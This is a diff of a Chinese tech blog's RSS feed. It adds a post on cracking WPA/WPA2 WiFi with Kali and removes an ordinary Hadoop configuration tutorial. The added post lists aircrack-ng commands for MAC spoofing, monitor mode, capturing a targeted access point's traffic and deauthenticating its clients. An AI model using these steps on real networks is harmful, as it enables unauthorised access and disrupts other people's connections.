@@ -5,9 +5,99 @@
     <description>Welcome to geek&#39;s world!</description>
     <link>https://wuyinan0126.github.io//</link>
     <atom:link href="https://wuyinan0126.github.io//feed.xml" rel="self" type="application/rss+xml" />
-    <pubDate>Tue, 26 Sep 2017 11:17:11 +0800</pubDate>
-    <lastBuildDate>Tue, 26 Sep 2017 11:17:11 +0800</lastBuildDate>
+    <pubDate>Wed, 01 Nov 2017 17:17:57 +0800</pubDate>
+    <lastBuildDate>Wed, 01 Nov 2017 17:17:57 +0800</lastBuildDate>
     <generator>Jekyll v3.0.2</generator>
+    
+      <item>
+        <title>&lt;font color=&#39;red&#39;&gt;[原创]&lt;/font&gt; 使用Kali破解WPA/WPA2 WiFi</title>
+        <description>&lt;p&gt;**&lt;/p&gt;
+
+&lt;h2 id=&quot;section&quot;&gt;使用密码表暴力破解&lt;/h2&gt;
+
+&lt;ol&gt;
+  &lt;li&gt;
+    &lt;p&gt;检查无线适配器状态&lt;/p&gt;
+
+    &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; # iwconfig
+ wlan0	IEEE 802.11  ESSID:off/any  
+   		Mode:Managed  Access Point: Not-Associated   Tx-Power=20 dBm   
+   		Retry short  long limit:2   RTS thr:off   Fragment thr:off
+   		Encryption key:off
+   		Power Management:off
+&lt;/code&gt;&lt;/pre&gt;
+    &lt;/div&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;[可选] 对于运行在virtual box中的虚拟机，需要执行以下命令&lt;/p&gt;
+
+    &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; # airmon-ng stop wlan0mon &amp;amp;&amp;amp; ifconfig wlan0 down &amp;amp;&amp;amp; macchanger -r wlan0 &amp;amp;&amp;amp; airmon-ng check kill &amp;amp;&amp;amp; ifconfig wlan0 up
+&lt;/code&gt;&lt;/pre&gt;
+    &lt;/div&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;kill掉可能会造成monitor模式错误的进程&lt;/p&gt;
+
+    &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; # airmon-ng check kill
+ Killing these processes:
+   PID Name
+   563 dhclient
+   841 wpa_supplicant
+&lt;/code&gt;&lt;/pre&gt;
+    &lt;/div&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;在wlan0开始monitor模式&lt;/p&gt;
+
+    &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; # airmon-ng start wlan0
+ PHY		Interface	Driver		Chipset
+ phy0	wlan0		rt2800usb	Ralink Technology, Corp. RT5372
+ (mac80211 monitor mode vif enabled for [phy0]wlan0 on [phy0]wlan0mon)
+ (mac80211 station mode vif disabled for [phy0]wlan0)
+&lt;/code&gt;&lt;/pre&gt;
+    &lt;/div&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;查看周围的AP和连接上AP的clients，保留运行这个命令的终端&lt;/p&gt;
+
+    &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; # airodump-ng wlan0mon
+&lt;/code&gt;&lt;/pre&gt;
+    &lt;/div&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;新开一个终端，监听特定频段和SSID的AP&lt;/p&gt;
+
+    &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; # airodump-ng -c 11 --bssid 70:F9:6D:64:B5:60 -w ~/test wlan0mon
+&lt;/code&gt;&lt;/pre&gt;
+    &lt;/div&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;将连上该AP的clients强制下线&lt;/p&gt;
+
+    &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; # aireplay-ng --deauth 10 -a 70:F9:6D:64:B5:60 wlan0mon
+&lt;/code&gt;&lt;/pre&gt;
+    &lt;/div&gt;
+  &lt;/li&gt;
+&lt;/ol&gt;
+</description>
+        <pubDate>Tue, 26 Sep 2017 23:13:23 +0800</pubDate>
+        <link>https://wuyinan0126.github.io//2017/%E4%BD%BF%E7%94%A8Kali%E7%A0%B4%E8%A7%A3WPA-WPA2-WiFi/</link>
+        <guid isPermaLink="true">https://wuyinan0126.github.io//2017/%E4%BD%BF%E7%94%A8Kali%E7%A0%B4%E8%A7%A3WPA-WPA2-WiFi/</guid>
+        
+        <category>原创</category>
+        
+        <category>技术宅</category>
+        
+        <category>Kali</category>
+        
+        
+        <category>原创</category>
+        
+        <category>技术宅</category>
+        
+        <category>Kali</category>
+        
+      </item>
     
       <item>
         <title>&lt;font color=&#39;red&#39;&gt;[原创]&lt;/font&gt; 大数据学习笔记(9)-NoSQL</title>
@@ -2104,705 +2194,6 @@
         <pubDate>Sun, 04 Dec 2016 08:00:00 +0800</pubDate>
         <link>https://wuyinan0126.github.io//2016/%E5%A4%A7%E6%95%B0%E6%8D%AE%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0(3)-%E8%AE%A1%E7%AE%97%E6%A8%A1%E5%9E%8B/</link>
         <guid isPermaLink="true">https://wuyinan0126.github.io//2016/%E5%A4%A7%E6%95%B0%E6%8D%AE%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0(3)-%E8%AE%A1%E7%AE%97%E6%A8%A1%E5%9E%8B/</guid>
-        
-        <category>原创</category>
-        
-        <category>大数据</category>
-        
-        
-        <category>原创</category>
-        
-        <category>大数据</category>
-        
-      </item>
-    
-      <item>
-        <title>&lt;font color=&#39;red&#39;&gt;[原创]&lt;/font&gt; 大数据学习笔记(2)-Hadoop</title>
-        <description>&lt;p&gt;&lt;em&gt;深入学习Hadoop相关知识，并在集群上搭建Hadoop HA平台。包括介绍MapReduce计算框架、HDFS文件系统、YARN资源调度与管理系统、MapReduce和Yarn的参数配置等&lt;/em&gt;&lt;/p&gt;
-
-&lt;h2 id=&quot;hadoop&quot;&gt;Hadoop&lt;/h2&gt;
-&lt;hr /&gt;
-
-&lt;h3 id=&quot;mapreduce&quot;&gt;MapReduce&lt;/h3&gt;
-&lt;hr /&gt;
-
-&lt;p&gt;大数据计算中最常见的一种计算方式是&lt;strong&gt;批处理&lt;/strong&gt;。2004年Google发表了MapReduce计算范型和框架论文，这是一种构建在大规模PC之上的批处理计算框架，也是一种分布式计算模型，获得了极为广泛的应用。&lt;/p&gt;
-
-&lt;p&gt;MapReduce和传统的并行数据库系统(MPP)相比，更适合&lt;strong&gt;非结构化数据的ETL处理&lt;/strong&gt;(将数据从来源端经过抽取(extract)、转换(transform)、加载(load)至目的端的过程)，且其更具有&lt;strong&gt;扩展性和容错性&lt;/strong&gt;，但单机处理效率低。&lt;/p&gt;
-
-&lt;p&gt;MapReduce计算提供了简洁的编程接口，&lt;strong&gt;输入和输出均是Key/Value键值对&lt;/strong&gt;，只需根据业务逻辑实现Map和Reduce函数即可完成大规模数据的并行批处理任务。&lt;/p&gt;
-
-&lt;ul&gt;
-  &lt;li&gt;Map函数以Key/Value作为输入，经逻辑计算产生若干仍以Key/Value形式表达的中间数据。计算框架自动将中间数据中具有相同Key值的记录聚在一起，传递给Reduce函数作为输入&lt;/li&gt;
-  &lt;li&gt;Reduce函数以Map阶段传递过来的某个Key值及其对应的若干Value值作为输入，对这些Value进行逻辑计算，生成Key/Value即计算结果&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;p&gt;以上为MapReduce的简单介绍，更为详细的MapReduce计算模型学习笔记请参看我的另一篇博文：&lt;a href=&quot;https://wuyinan0126.github.io/2016/大数据学习笔记(3)-计算模型/&quot;&gt;大数据学习笔记(3)-计算模型&lt;/a&gt;&lt;/p&gt;
-
-&lt;hr /&gt;
-
-&lt;h3 id=&quot;hdfs&quot;&gt;HDFS&lt;/h3&gt;
-&lt;hr /&gt;
-
-&lt;p&gt;HDFS的全称是”Hadoop Distributed File System”，是Hadoop中的大规模分布式文件系统。它最初是Yahoo模仿Goole的GFS(Google File System)开发的开源系统，因此在整体架构上和GFS大致相同。与GFS一样，HDFS适合存储&lt;strong&gt;大文件&lt;/strong&gt;并为之提供高吞吐量的&lt;strong&gt;顺序读写&lt;/strong&gt;访问，不太适合大量随机读的应用场景，也不适合储存大量的小文件的应用场景。&lt;/p&gt;
-
-&lt;p&gt;在Hadoop1.x中，HDFS可以被看作简化版的开源GFS系统，因为其在实现时绕开了一些GFS的复杂方案而采用简化方案，因此限制了性能。在这个系列的版本中，存在的问题包括：单点失效和水平扩展不佳。单点失效会导致整个集群不可用，而水平扩展不佳会导致整个文件系统管理文件数目容易达到上限，所以集群规模达到一定程度就无法扩展。&lt;/p&gt;
-
-&lt;p&gt;在Hadoop2.x中，提出了高可用方案(High Availability, HA)和NameNode联盟(NameNode Federation)。其中高可用是为了解决单点失效问题，而NameNode联盟是为了解决整个系统的水平扩展问题。&lt;/p&gt;
-
-&lt;p&gt;以上为HDFS的简单介绍，更为详细的HDFS学习笔记请参看我的另一篇博文：&lt;a href=&quot;https://wuyinan0126.github.io/2016/大数据学习笔记(4)-分布式文件系统/&quot;&gt;大数据学习笔记(4)-分布式文件系统&lt;/a&gt;&lt;/p&gt;
-
-&lt;hr /&gt;
-
-&lt;h3 id=&quot;yarn&quot;&gt;YARN&lt;/h3&gt;
-&lt;hr /&gt;
-
-&lt;p&gt;YARN的全称是”Yet Another Resource Negotiator”，是一个独立的&lt;strong&gt;资源调度与管理系统&lt;/strong&gt;。&lt;/p&gt;
-
-&lt;p&gt;在Hadoop1.x中，所有任务的&lt;strong&gt;资源管理&lt;/strong&gt;以及&lt;strong&gt;生命周期管理&lt;/strong&gt;都由全局唯一的JobTracker负责，造成其功能繁复，限制了系统的可扩展性。同时JobTracker还存在单点失效的问题，一旦JobTracker故障，整个Hadoop集群将崩溃。&lt;/p&gt;
-
-&lt;p&gt;在Hadoop2.x中，将&lt;strong&gt;资源管理&lt;/strong&gt;与&lt;strong&gt;任务生命周期管理&lt;/strong&gt;功能分离，由ResourceManager(RM)负责资源管理，由ApplicationMaster(AM)负责任务所需资源申请管理与任务生命周期管理。这样的好处除了&lt;strong&gt;增强系统的可扩展性&lt;/strong&gt;，&lt;strong&gt;解决JobTracker单点故障问题&lt;/strong&gt;，还&lt;strong&gt;可以部署除MapReduce计算框架外的其他计算框架，共享底层硬件资源&lt;/strong&gt;。&lt;/p&gt;
-
-&lt;p&gt;以上为YARN的简单介绍，更为详细的YARN学习笔记请参看我的另一篇博文：&lt;a href=&quot;https://wuyinan0126.github.io/2016/大数据学习笔记()-资源调度和管理系统/&quot;&gt;大数据学习笔记()-资源调度和管理系统&lt;/a&gt;&lt;/p&gt;
-
-&lt;hr /&gt;
-
-&lt;h3 id=&quot;mapreduceyarn&quot;&gt;MapReduce和Yarn的参数配置&lt;/h3&gt;
-&lt;hr /&gt;
-
-&lt;p&gt;Yarn中资源的最小单位是容器（Container）。容器是一个Yarn的JVM进程，在MapReduce中，AM服务、map和reduce任务都是运行在一个容器中。可以通过&lt;a href=&quot;http://{RM_IP}:8088/cluster/scheduler&quot;&gt;http://{RM_IP}:8088/cluster/scheduler&lt;/a&gt;来查看正在运行的容器的状态&lt;/p&gt;
-
-&lt;ul&gt;
-  &lt;li&gt;
-    &lt;p&gt;在NM中，可以优化的参数有：&lt;/p&gt;
-
-    &lt;ul&gt;
-      &lt;li&gt;yarn.node-manager.resource.memory-mb&lt;/li&gt;
-    &lt;/ul&gt;
-
-    &lt;p&gt;此参数为物理机可用于分配给容器的&lt;strong&gt;物理内存&lt;/strong&gt;量，注意需要给物理机留出部分资源给操作系统使用，建议为总物理内存的80%~90%，默认为8192。在不同硬件配置的节点中，该值需要根据物理机实际配置来写&lt;/p&gt;
-
-    &lt;ul&gt;
-      &lt;li&gt;yarn.node-manager.resource.vcore&lt;/li&gt;
-    &lt;/ul&gt;
-
-    &lt;p&gt;同理，为物理机可用于分配给容器的虚拟CPU数（我理解为线程数），建议为物理CPU核数。默认为8，如果节点CPU核数不够8个，则需要调减小这个值，YARN不会智能的探测节点的物理CPU总数。在不同硬件配置的节点中，该值需要根据物理机实际配置来写&lt;/p&gt;
-
-    &lt;ul&gt;
-      &lt;li&gt;yarn.nodemanager.vmem-pmem-ratio&lt;/li&gt;
-    &lt;/ul&gt;
-
-    &lt;p&gt;此参数是指当任务每使用1MB&lt;strong&gt;物理内存&lt;/strong&gt;，最多可使用默认为2.1MB的&lt;strong&gt;虚拟内存&lt;/strong&gt;量。在JVM中，使用的内存分为虚拟内存和物理内存。JVM中所有存在内存中的对象都是虚拟内存，但在实际运行中只有一部分是实际加载在物理内存中的&lt;/p&gt;
-  &lt;/li&gt;
-  &lt;li&gt;
-    &lt;p&gt;在RM中，可以优化的参数有：&lt;/p&gt;
-
-    &lt;ul&gt;
-      &lt;li&gt;yarn.scheduler.minimum-allocation-mb&lt;/li&gt;
-    &lt;/ul&gt;
-
-    &lt;p&gt;当应用程序向RM申请容器时，RM按照此&lt;strong&gt;物理内存&lt;/strong&gt;量为单位分配给容器，默认为1024。例如，我们设置分配的最小单位为2GB，则RM分配出来的容器内存一定是2G的倍数。假设现在有一个程序向RM申请3.1G的内存，则RM会分配给它一个4GB的容器去执行&lt;/p&gt;
-
-    &lt;ul&gt;
-      &lt;li&gt;yarn.scheduler.maximum-allocation-mb&lt;/li&gt;
-    &lt;/ul&gt;
-
-    &lt;p&gt;此参数限定了RM可以分配给一个容器的最大&lt;strong&gt;物理内存&lt;/strong&gt;量，默认为8192。假设应用程序向RM申请的资源超过了这个值，RM会直接拒绝这个请求&lt;/p&gt;
-
-    &lt;ul&gt;
-      &lt;li&gt;yarn.scheduler.maximum-allocation-vcores&lt;/li&gt;
-    &lt;/ul&gt;
-
-    &lt;p&gt;同理，RM可以分配给一个容器的最多虚拟CPU个数，默认为32&lt;/p&gt;
-  &lt;/li&gt;
-  &lt;li&gt;
-    &lt;p&gt;在MapReduce中，可以优化的参数有：&lt;/p&gt;
-
-    &lt;ul&gt;
-      &lt;li&gt;mapreduce.map.memory.mb&lt;/li&gt;
-      &lt;li&gt;mapreduce.reduce.memory.mb&lt;/li&gt;
-    &lt;/ul&gt;
-
-    &lt;p&gt;用于AM向Yarn申请用于map或reduce task的容器时默认使用的&lt;strong&gt;物理内存&lt;/strong&gt;值，其值应该在RM中的一个容器可分配的最大最小内存之间，默认为1024。这个值是全局的，因此需要根据某个job的map或reduce task需要使用的内存量，在程序中覆盖这些参数&lt;/p&gt;
-
-    &lt;ul&gt;
-      &lt;li&gt;mapreduce.map.java.opts&lt;/li&gt;
-      &lt;li&gt;mapreduce.reduce.java.opts&lt;/li&gt;
-    &lt;/ul&gt;
-
-    &lt;p&gt;因为Yarn容器可以理解为一个JVM，这两个值主要是为需要运行JVM程序（java、scala等）准备的，用于设置JVM进程的堆大小。这个值应该比上面的物理内存值小（因为JVM除了堆还有别的对象需要占用内存），一般设置为上面值的0.75倍，如果JVM进程在执行中，堆上的对象申请的内存超过这个值，就会抛出OutOfMemory异常&lt;/p&gt;
-  &lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;p&gt;举个栗子：&lt;/p&gt;
-
-&lt;ul&gt;
-  &lt;li&gt;yarn.nodemanager.vmem-pmem-ratio = 2.1&lt;/li&gt;
-  &lt;li&gt;yarn.scheduler.minimum-allocation-mb = 1024&lt;/li&gt;
-  &lt;li&gt;mapreduce.map.memory.mb = 1536&lt;/li&gt;
-  &lt;li&gt;mapreduce.map.java.opts = 1024&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;p&gt;此时，由于mapreduce.map.memory.mb=1536，因此AM将向RM申请一个2048M内存的容器，当map task使用的物理内存量大于2048M时或使用的虚拟内存量大于2048*2.1=3225.6M时将被杀死。容器中有1024M内存用作JVM堆内存，其余内存为非堆内存。当java、scala等进程在堆内存中申请的内存超过1024M，将抛出OutOfMemory异常&lt;/p&gt;
-
-&lt;hr /&gt;
-
-&lt;h4 id=&quot;section&quot;&gt;实用工具&lt;/h4&gt;
-&lt;hr /&gt;
-
-&lt;p&gt;配置内存参数可以使用&lt;a href=&quot;https://docs.hortonworks.com/HDPDocuments/HDP2/HDP-2.3.6/bk_installing_manually_book/content/determine-hdp-memory-config.html&quot;&gt;yarn-util.py&lt;/a&gt;进行参考&lt;/p&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;# 查看每个物理CPU中core的个数(即核数)
-$ cat /proc/cpuinfo| grep &quot;cpu cores&quot;| uniq
-4
-$ python yarn-utils.py -c 4 -m 16 -d 1 -k True
- Using cores=4 memory=16GB disks=1 hbase=True
- Profile: cores=4 memory=12288MB reserved=4GB usableMem=12GB disks=1
- Num Container=3
- Container Ram=4096MB
- Used Ram=12GB
- Unused Ram=4GB
- yarn.scheduler.minimum-allocation-mb=4096
- yarn.scheduler.maximum-allocation-mb=12288
- yarn.nodemanager.resource.memory-mb=12288
- mapreduce.map.memory.mb=4096
- mapreduce.map.java.opts=-Xmx3276m
- mapreduce.reduce.memory.mb=4096
- mapreduce.reduce.java.opts=-Xmx3276m
- yarn.app.mapreduce.am.resource.mb=4096
- yarn.app.mapreduce.am.command-opts=-Xmx3276m
- mapreduce.task.io.sort.mb=1638
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
-
-&lt;hr /&gt;
-
-&lt;h2 id=&quot;hadoop-ha273&quot;&gt;安装Hadoop HA（版本2.7.3）&lt;/h2&gt;
-&lt;hr /&gt;
-
-&lt;h3 id=&quot;section-1&quot;&gt;准备工作&lt;/h3&gt;
-&lt;hr /&gt;
-
-&lt;ol&gt;
-  &lt;li&gt;
-    &lt;p&gt;按照&lt;a href=&quot;https://wuyinan0126.github.io/2016/大数据学习笔记(1)-Overview/&quot;&gt;大数据学习笔记(1)-Overview&lt;/a&gt;和&lt;a href=&quot;https://wuyinan0126.github.io/2017/大数据学习笔记(5)-分布式协调系统/&quot;&gt;大数据学习笔记(5)-分布式协调系统&lt;/a&gt;做好部署前提准备&lt;/p&gt;
-  &lt;/li&gt;
-  &lt;li&gt;
-    &lt;p&gt;下载Hadoop二进制包，并分发到所有节点，并解压至/opt/:&lt;/p&gt;
-
-    &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; $ ansible all -m copy -a &#39;src=/home/cat/cat/hadoop-2.7.3.tar.gz dest=/home/cat/cat/&#39;
- $ ansible all -a &#39;tar -zxvf /home/cat/cat/hadoop-2.7.3.tar.gz -C /opt/&#39;
-&lt;/code&gt;&lt;/pre&gt;
-    &lt;/div&gt;
-  &lt;/li&gt;
-  &lt;li&gt;
-    &lt;p&gt;创建数据文件夹、日志文件夹和myid文件:&lt;/p&gt;
-
-    &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; $ ansible all -a &#39;mkdir -p /opt/hadoop-2.7.3/var/name&#39;
- $ ansible all -a &#39;mkdir -p /opt/hadoop-2.7.3/var/data&#39;
- $ ansible all -a &#39;mkdir -p /opt/hadoop-2.7.3/var/tmp&#39;
- $ ansible all -a &#39;mkdir -p /opt/hadoop-2.7.3/var/journal&#39;
-&lt;/code&gt;&lt;/pre&gt;
-    &lt;/div&gt;
-  &lt;/li&gt;
-&lt;/ol&gt;
-
-&lt;hr /&gt;
-
-&lt;h3 id=&quot;hadoop-1&quot;&gt;配置Hadoop&lt;/h3&gt;
-&lt;hr /&gt;
-
-&lt;ol&gt;
-  &lt;li&gt;
-    &lt;p&gt;etc/hadoop/core-site.xml&lt;/p&gt;
-
-    &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; &amp;lt;configuration&amp;gt;
-   &amp;lt;property&amp;gt;      
-     &amp;lt;name&amp;gt;fs.defaultFS&amp;lt;/name&amp;gt;      
-     &amp;lt;value&amp;gt;hdfs://cats&amp;lt;/value&amp;gt; 
-     &amp;lt;description&amp;gt;默认的HDFS路径，与hdfs-site.xml中的配置相关。当有多个HDFS集群存在时，用此名字指定集群&amp;lt;/description&amp;gt; 
-   &amp;lt;/property&amp;gt;  
-   &amp;lt;property&amp;gt;      
-     &amp;lt;name&amp;gt;hadoop.tmp.dir&amp;lt;/name&amp;gt;     
-     &amp;lt;value&amp;gt;file:///opt/hadoop-2.7.3/var/tmp&amp;lt;/value&amp;gt; 
-     &amp;lt;description&amp;gt;NameNode、DataNode、JournalNode等存放数据的公共目录，也可以自己单独指定这三类节点的目录&amp;lt;/description&amp;gt;
-   &amp;lt;/property&amp;gt;  
-   &amp;lt;property&amp;gt;
-     &amp;lt;name&amp;gt;hadoop.http.staticuser.user&amp;lt;/name&amp;gt;
-     &amp;lt;value&amp;gt;cat&amp;lt;/value&amp;gt;
-     &amp;lt;description&amp;gt;WEB UI登录用户，默认为Dr.Who，权限较小&amp;lt;/description&amp;gt;
-   &amp;lt;/property&amp;gt;
-   &amp;lt;property&amp;gt;      
-     &amp;lt;name&amp;gt;ha.zookeeper.quorum&amp;lt;/name&amp;gt;      
-     &amp;lt;value&amp;gt;10.2.2.141:2181,10.2.2.142:2181,10.2.2.143:2181&amp;lt;/value&amp;gt;
-     &amp;lt;description&amp;gt;这里是ZooKeeper集群的地址和端口。注意，数量一定是奇数，且不少于三个节点&amp;lt;/description&amp;gt;
-   &amp;lt;/property&amp;gt;
- &amp;lt;/configuration&amp;gt;    
-&lt;/code&gt;&lt;/pre&gt;
-    &lt;/div&gt;
-  &lt;/li&gt;
-  &lt;li&gt;
-    &lt;p&gt;etc/hadoop/hadoop-env.sh&lt;/p&gt;
-
-    &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; export JAVA_HOME=/opt/jdk1.8.0_121
- export HADOOP_PID_DIR=/opt/hadoop-2.7.3/var/tmp
- export HADOOP_SECURE_DN_PID_DIR=/opt/hadoop-2.7.3/var/tmp
-&lt;/code&gt;&lt;/pre&gt;
-    &lt;/div&gt;
-  &lt;/li&gt;
-  &lt;li&gt;
-    &lt;p&gt;etc/hadoop/hdfs-site.xml&lt;/p&gt;
-
-    &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; &amp;lt;configuration&amp;gt;
-   &amp;lt;property&amp;gt;
-     &amp;lt;name&amp;gt;dfs.name.dir&amp;lt;/name&amp;gt;
-     &amp;lt;value&amp;gt;file:///opt/hadoop-2.7.3/var/name&amp;lt;/value&amp;gt;
-     &amp;lt;description&amp;gt;NameNode存储命名空间和操作日志相关的元数据信息的本地文件系统路径&amp;lt;/description&amp;gt;
-   &amp;lt;/property&amp;gt;
-   &amp;lt;property&amp;gt;
-     &amp;lt;name&amp;gt;dfs.data.dir&amp;lt;/name&amp;gt;
-     &amp;lt;value&amp;gt;file:///opt/hadoop-2.7.3/var/data&amp;lt;/value&amp;gt;
-     &amp;lt;description&amp;gt;DataNode节点存储HDFS文件的本地文件系统路径&amp;lt;/description&amp;gt;
-   &amp;lt;/property&amp;gt;
-   &amp;lt;property&amp;gt;
-     &amp;lt;name&amp;gt;dfs.replication&amp;lt;/name&amp;gt;  
-     &amp;lt;value&amp;gt;3&amp;lt;/value&amp;gt;
-     &amp;lt;description&amp;gt;指定DataNode存储block的副本数量。默认值是3个，不大于DataNode个数即可&amp;lt;/description&amp;gt;
-   &amp;lt;/property&amp;gt;  
-   &amp;lt;property&amp;gt;
-     &amp;lt;name&amp;gt;dfs.webhdfs.enabled&amp;lt;/name&amp;gt;
-     &amp;lt;value&amp;gt;true&amp;lt;/value&amp;gt;
-   &amp;lt;/property&amp;gt;
-   &amp;lt;property&amp;gt;      
-     &amp;lt;name&amp;gt;dfs.nameservices&amp;lt;/name&amp;gt;    
-     &amp;lt;value&amp;gt;cats&amp;lt;/value&amp;gt; 
-     &amp;lt;description&amp;gt;集群的逻辑名称，自己任意取&amp;lt;/description&amp;gt;     
-   &amp;lt;/property&amp;gt;  
-   &amp;lt;property&amp;gt;  
-     &amp;lt;name&amp;gt;dfs.ha.namenodes.cats&amp;lt;/name&amp;gt;  
-     &amp;lt;value&amp;gt;catk,catq&amp;lt;/value&amp;gt;
-     &amp;lt;description&amp;gt;两个namenode的逻辑名称，自己任意取&amp;lt;/description&amp;gt; 
-   &amp;lt;/property&amp;gt;  
-   &amp;lt;property&amp;gt;  
-     &amp;lt;name&amp;gt;dfs.namenode.rpc-address.cats.catk&amp;lt;/name&amp;gt;  
-     &amp;lt;value&amp;gt;10.2.2.141:8020&amp;lt;/value&amp;gt;  
-   &amp;lt;/property&amp;gt;  
-   &amp;lt;property&amp;gt;      
-     &amp;lt;name&amp;gt;dfs.namenode.http-address.cats.catk&amp;lt;/name&amp;gt;      
-     &amp;lt;value&amp;gt;10.2.2.141:50070&amp;lt;/value&amp;gt;      
-   &amp;lt;/property&amp;gt;      
-   &amp;lt;property&amp;gt;      
-     &amp;lt;name&amp;gt;dfs.namenode.rpc-address.cats.catq&amp;lt;/name&amp;gt;      
-     &amp;lt;value&amp;gt;10.2.2.142:8020&amp;lt;/value&amp;gt;      
-   &amp;lt;/property&amp;gt;  
-   &amp;lt;property&amp;gt;      
-     &amp;lt;name&amp;gt;dfs.namenode.http-address.cats.catq&amp;lt;/name&amp;gt;      
-     &amp;lt;value&amp;gt;10.2.2.142:50070&amp;lt;/value&amp;gt;     
-   &amp;lt;/property&amp;gt;
-   &amp;lt;property&amp;gt;
-     &amp;lt;name&amp;gt;dfs.namenode.servicerpc-address.cats.catk&amp;lt;/name&amp;gt;  
-     &amp;lt;value&amp;gt;10.2.2.141:53310&amp;lt;/value&amp;gt;  
-   &amp;lt;/property&amp;gt;    
-   &amp;lt;property&amp;gt;  
-     &amp;lt;name&amp;gt;dfs.namenode.servicerpc-address.cats.catq&amp;lt;/name&amp;gt;  
-     &amp;lt;value&amp;gt;10.2.2.142:53310&amp;lt;/value&amp;gt;  
-   &amp;lt;/property&amp;gt;
-   &amp;lt;property&amp;gt;    
-     &amp;lt;name&amp;gt;dfs.ha.automatic-failover.enabled&amp;lt;/name&amp;gt;    
-     &amp;lt;value&amp;gt;true&amp;lt;/value&amp;gt; 
-     &amp;lt;description&amp;gt;指定cats是否自动故障恢复，当NameNode出故障时，是否自动切换到另一台NameNode&amp;lt;/description&amp;gt;
-   &amp;lt;/property&amp;gt;     
-   &amp;lt;!--指定JournalNode --&amp;gt;  
-   &amp;lt;property&amp;gt;  
-     &amp;lt;name&amp;gt;dfs.namenode.shared.edits.dir&amp;lt;/name&amp;gt;       
-     &amp;lt;value&amp;gt;qjournal://10.2.2.144:8485;10.2.2.145:8485;10.2.2.146:8485;10.2.2.147:8485;10.2.2.148:8485;10.2.2.149:8485;10.2.2.150:8485;10.2.2.151:8485;10.2.2.152:8485/cats&amp;lt;/value&amp;gt; 
-     &amp;lt;description&amp;gt;两个NameNode为了数据同步，会通过一组称作JournalNodes的独立进程进行相互通信。当active状态的NameNode的命名空间有任何修改时，会告知大部分的JournalNodes进程。standby状态的NameNode有能力读取JNs中的变更信息，并且一直监控editl og的变化，把变化应用于自己的命名空间。standby可以确保在集群出错时，命名空间状态已经完全同步了。指定cats的两个NameNode共享edits文件目录时，使用的JournalNode集群信息，必须是奇数个，至少3个。&amp;lt;/description&amp;gt;  
-   &amp;lt;/property&amp;gt;  
-   &amp;lt;property&amp;gt;  
-     &amp;lt;name&amp;gt;dfs.client.failover.proxy.provider.cats&amp;lt;/name&amp;gt;       
-     &amp;lt;value&amp;gt;org.apache.hadoop.hdfs.server.namenode.ha.ConfiguredFailoverProxyProvider&amp;lt;/value&amp;gt;
-     &amp;lt;description&amp;gt;指定active出故障时，哪个实现类负责执行故障切换&amp;lt;/description&amp;gt;  
-   &amp;lt;/property&amp;gt;  
-   &amp;lt;property&amp;gt;      
-     &amp;lt;name&amp;gt;dfs.journalnode.edits.dir&amp;lt;/name&amp;gt;      
-     &amp;lt;value&amp;gt;/opt/hadoop-2.7.3/var/journal&amp;lt;/value&amp;gt;      
-   &amp;lt;/property&amp;gt;
-   &amp;lt;property&amp;gt;      
-     &amp;lt;name&amp;gt;dfs.ha.fencing.methods&amp;lt;/name&amp;gt;      
-     &amp;lt;value&amp;gt;sshfence&amp;lt;/value&amp;gt;  
-     &amp;lt;description&amp;gt;主备架构解决单点故障问题时，必须要认真解决的是脑裂问题，即出现两个master同时对外提供服务，导致系统处于不一致状态，可能导致数据丢失等潜在问题。在HDFS HA中，JournalNode只允许一个NameNode写数据，不会出现两个Active NameNode的问题，但是，当主备切换时，之前的Active NameNode可能仍在处理客户端的RPC请求，为此，需要增加隔离机制（ fencing）将之前的Active NameNode杀死。HDFS允许用户配置多个隔离机制，当发生主备切换时，将顺次执行这些隔离机制，直到一个返回成功。隔离机制包括shell和sshfence，sshfence通过ssh登录到前一个ActiveNameNode并将其杀死。为了让该机制成功执行，需配置免密码ssh登陆&amp;lt;/description&amp;gt;
-   &amp;lt;/property&amp;gt;  
-   &amp;lt;property&amp;gt;      
-     &amp;lt;name&amp;gt;dfs.ha.fencing.ssh.private-key-files&amp;lt;/name&amp;gt;      
-     &amp;lt;value&amp;gt;/home/cat/.ssh/id_rsa&amp;lt;/value&amp;gt;   
-   &amp;lt;/property&amp;gt;  
-   &amp;lt;property&amp;gt;  
